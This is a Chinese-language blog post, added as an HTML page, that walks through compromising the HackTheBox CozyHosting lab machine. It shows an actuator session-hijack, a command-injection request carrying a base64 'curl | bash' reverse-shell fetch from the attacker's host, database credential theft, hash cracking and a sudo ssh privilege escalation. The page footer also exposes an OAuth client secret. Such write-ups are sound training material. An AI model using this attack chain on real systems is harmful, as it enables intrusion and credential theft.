@@ -1,0 +1,329 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>HackTheBox—CozyHosting靶机 | white0123</title>
+<link rel="shortcut icon" href="https://wghahaha.github.io/favicon.ico?v=1714286336284">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://wghahaha.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="HackTheBox—CozyHosting靶机 | white0123 - Atom Feed" href="https://wghahaha.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="前言
+打靶训练第五台。
+最近开始玩HTB这个平台了。不知道为什么 我的windows客户端始终无法连接上，每次都会提示我什么证书错误，但是kali连接就不会出什么问题。所以打靶只能基于kali平台了。其实 什么平台打靶 什么工具打靶 都是其..." />
+    <meta name="keywords" content="HackTheBox" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://wghahaha.github.io">
+  <img class="avatar" src="https://wghahaha.github.io/images/avatar.png?v=1714286336284" alt="">
+  </a>
+  <h1 class="site-title">
+    white0123
+  </h1>
+  <p class="site-description">
+    永远保持第一天接触网络安全的热情
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              HackTheBox—CozyHosting靶机
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-09
+              </span>
+              <span>
+                4 min read
+              </span>
+              
+                <a href="https://wghahaha.github.io/tag/4AeNKZQf4/" class="post-tag">
+                  # HackTheBox
+                </a>
+              
+            </div>
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h2 id="前言">前言</h2>
+<p>打靶训练第五台。</p>
+<p>最近开始玩HTB这个平台了。不知道为什么 我的windows客户端始终无法连接上，每次都会提示我什么证书错误，但是kali连接就不会出什么问题。所以打靶只能基于kali平台了。其实 什么平台打靶 什么工具打靶 都是其次的，主要还是打靶过程中的思路和技巧。B站的红队笔记师傅 他的所有打靶视频似乎都是基于kali</p>
+<h2 id="信息收集">信息收集</h2>
+<p>连接上服务器后 启动机器 直接将机器的IP给出来了。</p>
+<figure data-type="image" tabindex="1"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009191708993.png" alt="image-20231009191708993" loading="lazy"></figure>
+<p>尝试ping一下 是否可以ping通</p>
+<figure data-type="image" tabindex="2"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009191752859.png" alt="c" loading="lazy"></figure>
+<p>成功ping通 使用nmap进行端口探测</p>
+<pre><code>nmap -sV 10.10.11.230
+</code></pre>
+<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009191851516.png" alt="image-20231009191851516" loading="lazy"></figure>
+<p>得到开放端口有 22 80端口</p>
+<blockquote>
+<p>简单分析一下</p>
+<p>22端口对应的服务为ssh 机器为一台linux 机器(这里机器页面也指出来了。)</p>
+<p>常见对应的攻击方式可能存在ssh暴力破解</p>
+<p>80端酒对应的是http服务 也是我们通常打点的入口。</p>
+<p>常见对应的方式就多了，web基础漏洞 信息泄露 文件上传 RCE等都有可能存在。</p>
+</blockquote>
+<p>开放了80端口 直接访问看一下。</p>
+<p>直接访问 无法访问 需要修改hosts文件</p>
+<p>Linux直接在 /etc/hosts</p>
+<pre><code>10.10.11.230 cozyhosting.htb
+</code></pre>
+<p>保存后重新访问。</p>
+<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009192556993.png" alt="image-20231009192556993" loading="lazy"></figure>
+<p>没看出来什么提示信息。</p>
+<p>目录扫描</p>
+<figure data-type="image" tabindex="5"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009192751989.png" alt="image-20231009192751989" loading="lazy"></figure>
+<p>扫描结果</p>
+<figure data-type="image" tabindex="6"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009193221298.png" alt="image-20231009193221298" loading="lazy"></figure>
+<p>有actuator 这是spring中有名的未授权访问</p>
+<p>访问sessions目录得到有效信息。</p>
+<pre><code>6BF14CA498E482F2B643FB1A417D5010 &quot;kanderson&quot;
+</code></pre>
+<p>通过查阅网上资料得到 在这里修改JSESSIONID 可以实现越权登录。</p>
+<p>访问/admin 抓包修改内容 可以成功登录进去。</p>
+<figure data-type="image" tabindex="7"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009203812235.png" alt="image-20231009203812235" loading="lazy"></figure>
+<h2 id="反弹shell">反弹shell</h2>
+<p>通过尝试和翻阅其他师傅的WP得到 在这一处存在RCE</p>
+<figure data-type="image" tabindex="8"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009203937533.png" alt="image-20231009203937533" loading="lazy"></figure>
+<p>抓包重放数据包。</p>
+<p>通过username反弹shell。</p>
+<p>在这里由于不可以存在空格和＋号，于是这里使用的是curl命令反弹shell。</p>
+<pre><code>curl 10.10.14.110/1.sh | bash
+</code></pre>
+<p>kali需要写好1.sh中的反弹shell代码</p>
+<figure data-type="image" tabindex="9"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009213755711.png" alt="image-20231009213755711" loading="lazy"></figure>
+<p>将上面的进行base64编码 然后拼接payload。</p>
+<pre><code>POST /executessh HTTP/1.1
+
+Host: cozyhosting.htb
+
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+
+Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+Accept-Encoding: gzip, deflate
+
+Content-Type: application/x-www-form-urlencoded
+
+Content-Length: 92
+
+Origin: http://cozyhosting.htb
+
+Connection: close
+
+Referer: http://cozyhosting.htb/admin
+
+Cookie: JSESSIONID=6BF14CA498E482F2B643FB1A417D5010
+
+Upgrade-Insecure-Requests: 1
+
+
+
+host=127&amp;username=;echo${IFS}&quot;Y3VybCAxMC4xMC4xNC4xMTAvMS5zaCB8IGJhc2g=&quot;|base64${IFS}-d|bash;
+</code></pre>
+<p>然后kali那边启动服务。</p>
+<pre><code>python3 -m http.server 80
+</code></pre>
+<p>然后反弹shell</p>
+<figure data-type="image" tabindex="10"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009214334803.png" alt="image-20231009214334803" loading="lazy"></figure>
+<h2 id="权限提升">权限提升</h2>
+<p>切换到home下发现 josh目录</p>
+<figure data-type="image" tabindex="11"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009214500043.png" alt="image-20231009214500043" loading="lazy"></figure>
+<p>但是我们没有权限进去。</p>
+<p>猜测这可能是ssh连接的账号。</p>
+<p>将/app目录下的 jar文件 下载下来并进行 解包操作。</p>
+<figure data-type="image" tabindex="12"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009214653216.png" alt="image-20231009214653216" loading="lazy"></figure>
+<p>翻看得到敏感数据</p>
+<figure data-type="image" tabindex="13"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009214732300.png" alt="image-20231009214732300" loading="lazy"></figure>
+<p>其中得到数据库的账号密码。</p>
+<p>连接数据库</p>
+<pre><code>psql -U postgres -W -h localhost -d cozyhosting
+</code></pre>
+<p>然后将密码粘贴。</p>
+<p>成功进入数据库得到带hash值的账号密码</p>
+<figure data-type="image" tabindex="14"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009215134977.png" alt="image-20231009215134977" loading="lazy"></figure>
+<p>使用john暴破出来第一个为</p>
+<p><strong>manchesterunited</strong></p>
+<p>使用ssh直接连接。</p>
+<p>账号为josh</p>
+<figure data-type="image" tabindex="15"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009220249191.png" alt="image-20231009220249191" loading="lazy"></figure>
+<p>成功进入。</p>
+<p>也得到了第一部分的flag。</p>
+<p>然后直接使用sudo -l查看可提权选项。</p>
+<figure data-type="image" tabindex="16"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009220406156.png" alt="image-20231009220406156" loading="lazy"></figure>
+<p>得到可以使用ssh。</p>
+<p>于是直接去GTF上查找相关内容。</p>
+<figure data-type="image" tabindex="17"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009220450287.png" alt="image-20231009220450287" loading="lazy"></figure>
+<figure data-type="image" tabindex="18"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009220500454.png" alt="image-20231009220500454" loading="lazy"></figure>
+<p>执行后成功提权为root用户 并得到flag。</p>
+<figure data-type="image" tabindex="19"><img src="https://raw.githubusercontent.com/wghahaha/img/main/img/image-20231009220531256.png" alt="image-20231009220531256" loading="lazy"></figure>
+<h2 id="总结">总结</h2>
+<p>这台靶机的难度在HTB上是easy模式 但是我感觉对于我来说并不是easy模式 难点主要在于反弹shell中使用curl反弹的方式以前没有用过。然后就是通过对jar文件进行解包得到数据库密码泄露，从而得到ssh的密码。权限提升的地方反而很简单,无脑在GTF上赋值就可以了。</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li>
+<ul>
+<li><a href="#%E5%89%8D%E8%A8%80">前言</a></li>
+<li><a href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86">信息收集</a></li>
+<li><a href="#%E5%8F%8D%E5%BC%B9shell">反弹shell</a></li>
+<li><a href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87">权限提升</a></li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+</li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://wghahaha.github.io/post/weblogic-ruo-kou-ling-getshell/">
+              <h3 class="post-title">
+                 Weblogic弱口令getshell
+              </h3>
+            </a>
+          </div>
+        
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: '60a6742bb0cdc1129286',
+    clientSecret: '2c932a185a0c37b7924302f1ab242ffd3c186641',
+    repo: 'wghahaha.github.io',
+    owner: 'wghahaha',
+    admin: ['wghahaha'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+        <div class="site-footer">
+  <div>
+	<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+	<span id="busuanzi_container_site_uv" style='display:none'>总访客人数量<span id="busuanzi_value_site_uv"></span>次</span>
+	<span id="busuanzi_container_site_pv" style='display:none'>本站总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+</div>
+  <a class="rss" href="https://wghahaha.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
